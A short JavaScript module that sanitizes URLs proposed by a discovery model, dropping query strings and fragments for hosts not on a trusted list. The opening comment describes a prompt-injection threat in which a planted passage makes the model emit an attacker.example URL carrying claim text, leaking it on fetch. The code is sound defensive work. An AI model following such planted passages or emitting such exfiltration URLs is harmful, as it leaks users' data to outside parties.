// URLs proposed by the discovery model are untrusted: a planted passage in an article or source could
// make the model emit https://attacker.example/?q=<claim text>, which would leak that text on fetch.
// Unless the host is on the trusted list, query strings and fragments are dropped before acquisition.
//
// Entries match the host itself and any subdomain. Defaults are deliberately short: government, court,
// patent-office and a few major open publishers. Add more with DISCOVERY_TRUSTED_HOSTS (comma separated).
export const DEFAULT_TRUSTED_HOSTS = ['gov', 'mil', 'gov.uk', 'europa.eu', 'epo.org', 'wipo.int', 'courtlistener.com', 'law.cornell.edu', 'arxiv.org', 'doi.org'];

export function parseTrustedHosts(value) {
  return String(value || '').split(',').map(item => item.trim().toLowerCase().replace(/^\*?\./, '')).filter(Boolean);
}

export function isTrustedHost(hostname, trustedHosts = DEFAULT_TRUSTED_HOSTS) {
  const host = String(hostname || '').toLowerCase().replace(/\.$/, '');
  return trustedHosts.some(entry => host === entry || host.endsWith(`.${entry}`));
}

// Returns the URL to fetch. Throws for anything that is not a credential-free http(s) URL.
export function sanitizeDiscoveredUrl(value, trustedHosts = DEFAULT_TRUSTED_HOSTS) {
  const url = new URL(String(value));
  if (!['http:', 'https:'].includes(url.protocol) || url.username || url.password) throw new Error('Only credential-free HTTP(S) source URLs are allowed');
  if (!isTrustedHost(url.hostname, trustedHosts)) { url.search = ''; url.hash = ''; }
  return url.toString();
}
